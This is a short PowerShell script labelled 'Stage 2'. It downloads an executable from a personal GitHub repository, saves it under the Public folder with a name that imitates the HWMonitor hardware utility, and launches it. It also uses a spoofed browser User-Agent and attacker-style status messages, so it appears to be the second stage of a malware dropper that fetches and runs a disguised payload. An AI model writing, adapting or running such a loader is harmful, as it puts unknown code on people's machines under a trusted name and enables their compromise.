# === Stage 2: Download binary from GitHub and execute ===

# Force TLS 1.2 to ensure secure HTTPS connection works
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# URL to your raw GitHub binary file - replace with your actual raw URL
$BinaryUrl = "https://github.com/mibomboclaaat/wwdtesting/raw/refs/heads/main/hwmonitor_1.58.exe"

# Destination path for the binary (world-writable directory)
$DestinationPath = "$env:PUBLIC\HWMonitor_x64.exe"

try {
    Write-Host "[*] Starting download from GitHub..."
    Invoke-WebRequest -Uri $BinaryUrl -OutFile $DestinationPath -Headers @{ "User-Agent" = "Mozilla/5.0" } -UseBasicParsing
    Write-Host "[+] Downloaded binary to $DestinationPath"
}
catch {
    Write-Host "[-] Failed to download the binary: $_"
    exit 1
}

try {
    Write-Host "[*] Executing the binary..."
    Start-Process -FilePath $DestinationPath
    Write-Host "[+] Binary execution started."
}
catch {
    Write-Host "[-] Failed to execute the binary: $_"
    exit 1
}
